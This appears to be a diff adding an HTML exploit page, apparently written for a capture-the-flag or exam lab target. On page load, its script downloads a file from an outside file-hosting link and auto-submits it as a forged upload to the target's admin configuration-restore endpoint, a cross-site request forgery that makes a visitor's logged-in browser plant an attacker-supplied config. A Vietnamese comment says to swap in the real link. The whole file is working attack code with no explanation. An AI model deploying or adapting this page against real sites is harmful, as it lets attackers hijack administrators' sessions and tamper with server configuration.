@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+  <head><meta charset="UTF-8"><title>Exploit</title></head>
+  <body>
+    <form id="upload" method="POST" action="https://cybershortlink-dc105f08.exam.cyberjutsu-lab.tech/admin/configs/restore" enctype="multipart/form-data"></form>
+    <script>
+      fetch("https://0x0.st/8xKY.sav") // Thay bằng link thật
+        .then(r => r.blob())
+        .then(blob => {
+          const file = new File([blob], "config_backup.sav");
+          const dt = new DataTransfer();
+          dt.items.add(file);
+          const input = document.createElement("input");
+          input.type = "file";
+          input.name = "config_file";
+          input.files = dt.files;
+          document.getElementById("upload").appendChild(input);
+          document.getElementById("upload").submit();
+        });
+    </script>
+  </body>
+</html>
